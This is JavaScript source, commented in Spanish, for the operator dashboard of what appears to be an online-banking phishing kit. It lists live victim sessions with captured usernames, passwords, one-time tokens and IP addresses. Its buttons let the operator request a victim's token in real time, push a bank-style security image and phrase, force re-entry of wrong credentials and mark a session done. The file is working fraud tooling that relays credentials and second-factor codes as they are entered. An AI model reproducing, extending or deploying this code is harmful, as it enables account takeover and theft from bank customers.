/**
 * Panel operador e-banca — sync vía API (funciona entre Chrome / Edge / etc).
 */
const LANE_COUNT = 5
const API = '/api/ops/sessions'
/** Hash SHA-256 de la clave (no va en texto plano). */
const PANEL_PASSWORD_HASH = '2e43159a30c6dc1b7ef1b482f029d54a15a21d38ebefc1579d6e28b08c5faafc'
const PANEL_AUTH_KEY = 'ba_panel_auth_v1'

async function sha256Hex(text) {
  const data = new TextEncoder().encode(text)
  const buf = await crypto.subtle.digest('SHA-256', data)
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('')
}

const gate = document.getElementById('panelGate')
const dash = document.getElementById('panelDash')
const gateForm = document.getElementById('panelGateForm')
const gateInput = document.getElementById('panelGateInput')
const gateError = document.getElementById('panelGateError')

function isPanelUnlocked() {
  try {
    return sessionStorage.getItem(PANEL_AUTH_KEY) === '1'
  } catch (_) {
    return false
  }
}

function unlockPanel() {
  try {
    sessionStorage.setItem(PANEL_AUTH_KEY, '1')
  } catch (_) {
    /* ignore */
  }
  if (gate) gate.hidden = true
  if (dash) dash.hidden = false
}

function showGate() {
  if (gate) gate.hidden = false
  if (dash) dash.hidden = true
  gateError && (gateError.hidden = true)
  window.setTimeout(() => gateInput?.focus(), 50)
}

if (!isPanelUnlocked()) {
  showGate()
} else {
  unlockPanel()
}

gateForm?.addEventListener('submit', (e) => {
  e.preventDefault()
  const value = String(gateInput?.value || '').trim()
  const btn = gateForm.querySelector('button[type="submit"]')
  if (btn) btn.disabled = true
  void sha256Hex(value)
    .then((hex) => {
      if (hex === PANEL_PASSWORD_HASH) {
        unlockPanel()
        startPanel()
        return
      }
      if (gateError) gateError.hidden = false
      if (gateInput) {
        gateInput.value = ''
        gateInput.focus()
      }
    })
    .catch(() => {
      if (gateError) {
        gateError.hidden = false
        gateError.textContent = 'No se pudo validar la clave'
      }
    })
    .finally(() => {
      if (btn) btn.disabled = false
    })
})

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')

const imagenModal = document.getElementById('imagenModal')
const modalUser = document.getElementById('modalUser')
const modalPhrase = document.getElementById('modalPhrase')
const modalPreview = document.getElementById('modalPreview')
const modalFile = document.getElementById('modalFile')
const dropzone = document.getElementById('dropzone')
const dropzoneHint = document.getElementById('dropzoneHint')
const btnPickFile = document.getElementById('btnPickFile')
const btnConfirmImagen = document.getElementById('btnConfirmImagen')

/** @type {Map<string, object>} */
const rows = new Map()
/** @type {Map<string, { imageSrc: string, phrase: string }>} */
const drafts = new Map()

/** @type {{ rowId: string, imageSrc: string, phrase: string } | null} */
let activeModal = null
let panelStarted = false

function startPanel() {
  if (panelStarted) return
  panelStarted = true
  hint.textContent = 'Conectando con el servidor…'
  void refreshSessions().then(() => {
    hint.textContent = rows.size
      ? `En cola: ${rows.size}. Pulsa Enviar imagen (arrastrar / pegar).`
      : 'Esperando usuarios del login… (Chrome/Edge OK)'
  })
  window.setInterval(() => {
    void refreshSessions()
  }, 1500)
}

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'waiting-token') return 'Esperando token'
  if (state === 'token') return 'En token'
  if (state === 'typing') return 'Escribiendo'
  if (state === 'typing-pass') return 'Escribiendo clave'
  if (state === 'typing-tejuino') return 'Escribiendo c.interna'
  if (state === 'waiting-imagen') return 'Esperando imagen'
  if (state === 'imagen') return 'En imagen'
  if (state === 'waiting-pass') return 'Esperando clave'
  if (state === 'c-interna') return 'Tejuino / C.interna'
  if (state === 'done') return 'Listo'
  if (state === 'error-pass') return 'Error clave'
  if (state === 'error-tejuino') return 'C.interna error'
  if (state === 'error-user') return 'Error user'
  if (state === 'error-token') return 'Error Token'
  if (state === 'error') return 'Error'
  return 'Nuevo'
}

function badgeClass(state) {
  if (
    state === 'waiting' ||
    state === 'waiting-token' ||
    state === 'token' ||
    state === 'waiting-imagen' ||
    state === 'waiting-pass' ||
    state === 'c-interna' ||
    state === 'typing' ||
    state === 'typing-pass' ||
    state === 'typing-tejuino'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'imagen') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (
    state === 'error-pass' ||
    state === 'error-tejuino' ||
    state === 'error-user' ||
    state === 'error' ||
    state === 'error-token'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-SV', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  const seen = row.last_seen || row.updatedAt || row.createdAt
  if (!seen) return false
  // 45s: tolera refrescos lentos tras enviar imagen
  return Date.now() - seen < 45000
}

async function api(url, init) {
  const res = await fetch(url, {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      ...(init?.headers || {}),
    },
    cache: 'no-store',
  })
  if (!res.ok) throw new Error(`HTTP ${res.status}`)
  return res.json()
}

function upsertLocal(session) {
  if (!session?.id) return
  const existing = rows.get(session.id)
  const nextToken =
    session.token != null && String(session.token).trim() !== ''
      ? String(session.token)
      : existing?.token || ''
  const nextClave =
    session.password != null && String(session.password).trim() !== ''
      ? String(session.password)
      : session.clave != null && String(session.clave).trim() !== '' && String(session.clave) !== '—'
        ? String(session.clave)
        : existing?.clave && existing.clave !== '—'
          ? existing.clave
          : '—'
  if (existing) {
    Object.assign(existing, {
      user: session.username ?? session.user ?? existing.user,
      clave: nextClave,
      device: session.device ?? existing.device,
      ip: session.ip ?? existing.ip,
      token: nextToken,
      imageSrc: session.imageSrc || existing.imageSrc,
      phrase: session.phrase || existing.phrase,
      last_seen: session.last_seen || existing.last_seen,
      updatedAt: session.updatedAt || Date.now(),
      state: session.state || existing.state || 'waiting',
      createdAt: existing.createdAt || session.createdAt || Date.now(),
    })
  } else {
    rows.set(session.id, {
      id: session.id,
      index: 0,
      createdAt: session.createdAt || Date.now(),
      updatedAt: session.updatedAt || Date.now(),
      last_seen: session.last_seen || Date.now(),
      device: session.device || 'desktop',
      ip: session.ip || '127.0.0.1',
      user: session.username || session.user || '—',
      clave: nextClave,
      token: nextToken,
      imageSrc: session.imageSrc || '',
      phrase: session.phrase || '',
      state: session.state || 'waiting',
    })
  }
}

async function refreshSessions() {
  try {
    const data = await api(API)
    const list = Array.isArray(data.sessions) ? data.sessions : []
    const ids = new Set(list.map((s) => s.id))
    ;[...rows.keys()].forEach((id) => {
      if (!ids.has(id)) rows.delete(id)
    })
    list.forEach((session) => upsertLocal(session))
    render()
  } catch (err) {
    hint.textContent = 'No se pudo conectar con /api/ops/sessions'
  }
}

async function setRowState(rowId, state, action, extra = {}) {
  const row = rows.get(rowId)
  if (!row) return
  try {
    if (action) {
      await api(`${API}/${rowId}/action`, {
        method: 'POST',
        body: JSON.stringify({
          action,
          imageSrc: extra.imageSrc,
          phrase: extra.phrase,
        }),
      })
    } else {
      await api(`${API}/${rowId}`, {
        method: 'PATCH',
        body: JSON.stringify({ state, ...extra }),
      })
    }
    hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
    await refreshSessions()
  } catch (_) {
    hint.textContent = 'Error al enviar acción'
  }
}

function readFileAsDataUrl(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => resolve(String(reader.result || ''))
    reader.onerror = reject
    reader.readAsDataURL(file)
  })
}

/** Comprime la imagen antes de subir (evita desconexiones por JSON enorme). */
function compressImageFile(file, maxSide = 720, quality = 0.72) {
  return new Promise((resolve, reject) => {
    const url = URL.createObjectURL(file)
    const img = new Image()
    img.onload = () => {
      try {
        let { width, height } = img
        const scale = Math.min(1, maxSide / Math.max(width, height))
        width = Math.max(1, Math.round(width * scale))
        height = Math.max(1, Math.round(height * scale))
        const canvas = document.createElement('canvas')
        canvas.width = width
        canvas.height = height
        const ctx = canvas.getContext('2d')
        if (!ctx) {
          URL.revokeObjectURL(url)
          reject(new Error('canvas'))
          return
        }
        ctx.drawImage(img, 0, 0, width, height)
        const dataUrl = canvas.toDataURL('image/jpeg', quality)
        URL.revokeObjectURL(url)
        resolve(dataUrl)
      } catch (err) {
        URL.revokeObjectURL(url)
        reject(err)
      }
    }
    img.onerror = () => {
      URL.revokeObjectURL(url)
      reject(new Error('image'))
    }
    img.src = url
  })
}

function syncModalPreview() {
  if (!activeModal) return
  const has = Boolean(activeModal.imageSrc)
  dropzone.classList.toggle('has-image', has)
  if (has) {
    modalPreview.hidden = false
    modalPreview.src = activeModal.imageSrc
    dropzoneHint.hidden = true
  } else {
    modalPreview.hidden = true
    modalPreview.removeAttribute('src')
    dropzoneHint.hidden = false
  }
}

async function applyImageFile(file) {
  if (!activeModal || !file || !file.type.startsWith('image/')) {
    hint.textContent = 'Pega o arrastra un archivo de imagen'
    return
  }
  try {
    let dataUrl
    try {
      dataUrl = await compressImageFile(file)
    } catch (_) {
      dataUrl = await readFileAsDataUrl(file)
    }
    activeModal.imageSrc = dataUrl
    drafts.set(activeModal.rowId, {
      imageSrc: dataUrl,
      phrase: activeModal.phrase || modalPhrase.value || '',
    })
    syncModalPreview()
    hint.textContent = 'Imagen lista. Escribe o pega la frase y confirma.'
  } catch (_) {
    hint.textContent = 'No se pudo leer la imagen'
  }
}

function openImagenModal(rowId) {
  const row = rows.get(rowId)
  if (!row) return
  const draft = drafts.get(rowId) || { imageSrc: '', phrase: '' }
  activeModal = {
    rowId,
    imageSrc: draft.imageSrc || '',
    phrase: draft.phrase || '',
  }
  modalUser.textContent = row.user || '—'
  modalPhrase.value = activeModal.phrase
  if (modalFile) modalFile.value = ''
  syncModalPreview()
  imagenModal.hidden = false
  dropzone.focus()
  hint.textContent = 'Arrastra o pega la imagen (Ctrl+V), luego escribe o pega la frase.'
}

function closeImagenModal() {
  if (activeModal) {
    drafts.set(activeModal.rowId, {
      imageSrc: activeModal.imageSrc || '',
      phrase: modalPhrase.value.trim(),
    })
  }
  activeModal = null
  imagenModal.hidden = true
  dropzone.classList.remove('is-drag')
}

async function confirmImagenModal() {
  if (!activeModal) return
  const imageSrc = (activeModal.imageSrc || '').trim()
  const phrase = modalPhrase.value.trim()
  if (!imageSrc) {
    hint.textContent = 'Falta la imagen (arrástrala o pégala)'
    dropzone.focus()
    return
  }
  if (!phrase) {
    hint.textContent = 'Falta la frase de seguridad'
    modalPhrase.focus()
    return
  }
  const rowId = activeModal.rowId
  drafts.set(rowId, { imageSrc, phrase })
  btnConfirmImagen.disabled = true
  try {
    await setRowState(rowId, 'imagen', 'send-imagen', { imageSrc, phrase })
    closeImagenModal()
  } finally {
    btnConfirmImagen.disabled = false
  }
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num" data-label="#"></td>
    <td class="col-time mono" data-label="Hora"></td>
    <td class="col-device" data-label="Dispositivo"></td>
    <td class="col-user mono copyable" data-label="Usuario" title="Copiar usuario"></td>
    <td class="col-token mono copyable" data-label="Token" title="Copiar token"></td>
    <td class="col-pass mono copyable" data-label="Clave" title="Copiar clave"></td>
    <td class="col-online" data-label="Conexión"></td>
    <td class="col-status" data-label="Estado"></td>
    <td class="col-send" data-label="Envío" data-send-cell></td>
    <td class="col-actions" data-label="Acciones">
      <div class="row-actions">
        <button type="button" class="btn btn--ok" data-action="ask-token" data-tooltip="Pedir token (Solicitar token al cliente)" title="Pedir token (Solicitar token al cliente)" aria-label="Pedir token">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <circle cx="7.5" cy="15.5" r="4.5"/>
            <path d="m21 3-9.5 9.5"/>
            <path d="m15.5 7.5 3 3"/>
            <path d="m18.5 4.5 2 2"/>
          </svg>
        </button>
        <button type="button" class="btn btn--ok" data-action="send-imagen" data-tooltip="Enviar imagen y frase de seguridad" title="Enviar imagen y frase de seguridad" aria-label="Enviar imagen">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <rect width="18" height="18" x="3" y="3" rx="2" ry="2"/>
            <circle cx="9" cy="9" r="2"/>
            <path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/>
          </svg>
        </button>
        <button type="button" class="btn btn--ok" data-action="c-interna" data-tooltip="Consulta interna (Pantalla de validación / espera)" title="Consulta interna (Pantalla de validación / espera)" aria-label="Consulta interna">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
            <path d="M3 3v5h5"/>
            <path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/>
            <path d="M16 16h5v5"/>
          </svg>
        </button>
        <button type="button" class="btn btn--error" data-action="error-tejuino" data-tooltip="Error consulta interna (Fallo en pantalla de validación)" title="Error consulta interna (Fallo en pantalla de validación)" aria-label="Error consulta interna">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
            <line x1="12" y1="9" x2="12" y2="13"/>
            <line x1="12" y1="17" x2="12.01" y2="17"/>
          </svg>
        </button>
        <button type="button" class="btn btn--error" data-action="error-token" data-tooltip="Error de Token (Token inválido o expirado)" title="Error de Token (Token inválido o expirado)" aria-label="Error de Token">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <circle cx="7.5" cy="15.5" r="4.5"/>
            <path d="m21 3-9.5 9.5"/>
            <line x1="15" y1="15" x2="21" y2="21"/>
            <line x1="21" y1="15" x2="15" y2="21"/>
          </svg>
        </button>
        <button type="button" class="btn btn--error" data-action="error-user" data-tooltip="Error de Usuario (Usuario incorrecto o no existe)" title="Error de Usuario (Usuario incorrecto o no existe)" aria-label="Error de Usuario">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
            <circle cx="9" cy="7" r="4"/>
            <line x1="17" y1="8" x2="22" y2="13"/>
            <line x1="22" y1="8" x2="17" y2="13"/>
          </svg>
        </button>
        <button type="button" class="btn btn--error" data-action="error-pass" data-tooltip="Error de Clave (Contraseña incorrecta)" title="Error de Clave (Contraseña incorrecta)" aria-label="Error de Clave">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <rect width="14" height="10" x="5" y="11" rx="2" ry="2"/>
            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
            <line x1="10" y1="14" x2="14" y2="18"/>
            <line x1="14" y1="14" x2="10" y2="18"/>
          </svg>
        </button>
        <button type="button" class="btn btn--done" data-action="done" data-tooltip="Listo (Acceso concedido / Finalizar sesión)" title="Listo (Acceso concedido / Finalizar sesión)" aria-label="Listo">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
            <polyline points="22 4 12 14.01 9 11.01"/>
          </svg>
        </button>
      </div>
    </td>
  `

  if (!drafts.has(row.id)) {
    drafts.set(row.id, { imageSrc: '', phrase: '' })
  }

  tr.querySelector('[data-action="ask-token"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'token', 'ask-token')
  })
  tr.querySelector('[data-action="send-imagen"]')?.addEventListener('click', () => {
    openImagenModal(row.id)
  })
  tr.querySelector('[data-action="c-interna"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'c-interna', 'c-interna')
  })
  tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'error-token', 'error-token')
  })
  tr.querySelector('[data-action="error-user"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'error-user', 'error-user')
  })
  tr.querySelector('[data-action="error-pass"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'error-pass', 'error-pass')
  })
  tr.querySelector('[data-action="error-tejuino"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'error-tejuino', 'error-tejuino')
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    void setRowState(row.id, 'done', 'done')
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      const ok = await copyText(text)
      if (!ok) {
        hint.textContent = 'No se pudo copiar (permiso del navegador)'
        return
      }
      td.classList.add('copied')
      hint.textContent = `Copiado: ${text.length > 28 ? `${text.slice(0, 28)}…` : text}`
      setTimeout(() => td.classList.remove('copied'), 900)
    })
  })

  return tr
}

async function copyText(text) {
  try {
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text)
      return true
    }
  } catch (_) {
    /* fallback abajo */
  }
  try {
    const ta = document.createElement('textarea')
    ta.value = text
    ta.setAttribute('readonly', '')
    ta.style.position = 'fixed'
    ta.style.left = '-9999px'
    document.body.appendChild(ta)
    ta.select()
    const ok = document.execCommand('copy')
    document.body.removeChild(ta)
    return ok
  } catch (_) {
    return false
  }
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-user').textContent = row.user || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const draft = drafts.get(row.id)
  const shownSrc = row.imageSrc || draft?.imageSrc || ''
  const sendCell = tr.querySelector('[data-send-cell]')
  if (sendCell) {
    sendCell.replaceChildren()
    const wrap = document.createElement('span')
    wrap.className = 'send-status'
    if (shownSrc) {
      const img = document.createElement('img')
      img.src = shownSrc
      img.alt = ''
      wrap.append(img, document.createTextNode(row.state === 'imagen' ? 'Enviado' : 'Listo'))
    } else if (row.state === 'waiting-imagen') {
      wrap.textContent = 'Pendiente'
    } else {
      wrap.textContent = '—'
    }
    sendCell.append(wrap)
  }

  const askBtn = tr.querySelector('[data-action="ask-token"]')
  const sendBtn = tr.querySelector('[data-action="send-imagen"]')
  const cInternaBtn = tr.querySelector('[data-action="c-interna"]')
  const doneBtn = tr.querySelector('[data-action="done"]')
  askBtn?.classList.toggle('is-on', row.state === 'waiting-token')
  sendBtn?.classList.toggle('is-on', row.state === 'waiting-imagen')
  cInternaBtn?.classList.toggle('is-on', row.state === 'c-interna')
  doneBtn?.classList.toggle('is-on', row.state === 'waiting-pass')
  tr.classList.toggle(
    'is-waiting',
    row.state === 'waiting-imagen' ||
      row.state === 'waiting-token' ||
      row.state === 'waiting-pass' ||
      row.state === 'c-interna' ||
      row.state === 'typing' ||
      row.state === 'typing-pass' ||
      row.state === 'typing-tejuino',
  )
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)
    laneEl?.classList.toggle('is-empty', laneRows.length === 0)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      if (!rows.has(tr.dataset.rowId)) tr.remove()
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

/* Modal: drag / drop / paste / pick */
imagenModal?.querySelectorAll('[data-modal-close]').forEach((el) => {
  el.addEventListener('click', () => closeImagenModal())
})

btnConfirmImagen?.addEventListener('click', () => {
  void confirmImagenModal()
})

modalPhrase?.addEventListener('input', () => {
  if (!activeModal) return
  activeModal.phrase = modalPhrase.value
})

modalPhrase?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault()
    void confirmImagenModal()
  }
})

btnPickFile?.addEventListener('click', (e) => {
  e.stopPropagation()
  modalFile?.click()
})

dropzone?.addEventListener('click', () => {
  modalFile?.click()
})

modalFile?.addEventListener('change', () => {
  const file = modalFile.files?.[0]
  if (file) void applyImageFile(file)
})

;['dragenter', 'dragover'].forEach((type) => {
  dropzone?.addEventListener(type, (e) => {
    e.preventDefault()
    e.stopPropagation()
    dropzone.classList.add('is-drag')
  })
})

;['dragleave', 'drop'].forEach((type) => {
  dropzone?.addEventListener(type, (e) => {
    e.preventDefault()
    e.stopPropagation()
    if (type === 'dragleave') dropzone.classList.remove('is-drag')
  })
})

dropzone?.addEventListener('drop', (e) => {
  dropzone.classList.remove('is-drag')
  const file = e.dataTransfer?.files?.[0]
  if (file) void applyImageFile(file)
})

document.addEventListener('paste', (e) => {
  if (!activeModal || imagenModal.hidden) return
  const items = e.clipboardData?.items
  if (!items) return

  // Si el foco está en el campo frase y hay texto, dejar pegar texto normal
  const target = e.target
  const inPhrase =
    target === modalPhrase ||
    (target instanceof HTMLElement && target.id === 'modalPhrase')

  for (const item of items) {
    if (item.type.startsWith('image/')) {
      e.preventDefault()
      const file = item.getAsFile()
      if (file) void applyImageFile(file)
      return
    }
  }

  // Pegar texto en frase aunque el foco esté en la dropzone
  if (!inPhrase) {
    const text = e.clipboardData?.getData('text/plain')?.trim()
    if (text && !activeModal.imageSrc) {
      // sin imagen: si pegan solo texto, va a la frase
      modalPhrase.value = text.slice(0, 80)
      activeModal.phrase = modalPhrase.value
      modalPhrase.focus()
      e.preventDefault()
    }
  }
})

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && activeModal) closeImagenModal()
})

btnClean?.addEventListener('click', async () => {
  const ok = window.confirm(
    '¿Seguro que quieres limpiar TODA la cola?\nEsta acción no se puede deshacer.',
  )
  if (!ok) return
  try {
    await api(API, { method: 'DELETE' })
    rows.clear()
    drafts.clear()
    closeImagenModal()
    hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
    render()
  } catch (_) {
    hint.textContent = 'No se pudo limpiar'
  }
})

hint.textContent = 'Conectando con el servidor…'
if (isPanelUnlocked()) {
  startPanel()
}

// Tooltip flotante instantáneo al pasar el mouse / clic por encima
const globalTooltip = document.createElement('div')
globalTooltip.className = 'panel-tooltip'
globalTooltip.hidden = true
document.body.appendChild(globalTooltip)

document.addEventListener('mouseover', (e) => {
  const btn = e.target.closest('[data-tooltip]')
  if (!btn) return
  const text = btn.getAttribute('data-tooltip')
  if (!text) return
  globalTooltip.textContent = text
  globalTooltip.hidden = false
  const rect = btn.getBoundingClientRect()
  const tipRect = globalTooltip.getBoundingClientRect()
  let top = rect.top - tipRect.height - 8
  let left = rect.left + rect.width / 2 - tipRect.width / 2
  if (top < 4) top = rect.bottom + 8
  if (left < 6) left = 6
  if (left + tipRect.width > window.innerWidth - 6) {
    left = window.innerWidth - tipRect.width - 6
  }
  globalTooltip.style.top = `${top + window.scrollY}px`
  globalTooltip.style.left = `${left + window.scrollX}px`
})

document.addEventListener('mouseout', (e) => {
  const btn = e.target.closest('[data-tooltip]')
  if (btn) {
    globalTooltip.hidden = true
  }
})

